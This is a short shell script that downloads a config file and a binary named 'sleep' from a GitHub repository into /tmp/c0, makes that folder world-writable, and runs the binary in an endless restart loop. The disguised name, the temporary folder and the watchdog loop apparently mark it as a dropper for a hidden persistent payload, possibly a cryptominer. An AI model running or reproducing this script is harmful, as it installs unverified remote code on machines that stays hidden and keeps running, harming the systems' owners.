#!/bin/bash
## requirement
apt-get -qq update
apt-get -qq install -y wget curl unzip


mkdir -p /tmp/c0
cd /tmp/c0
wget https://raw.githubusercontent.com/Blenkinship/any/main/config.json
wget https://raw.githubusercontent.com/Blenkinship/any/main/sleep
chmod -R  777 /tmp/c0
#!/bin/sh
while [ 1 ]; do
	/tmp/c0/sleep --config=/tmp/c0/config.json
	sleep 5
done







##
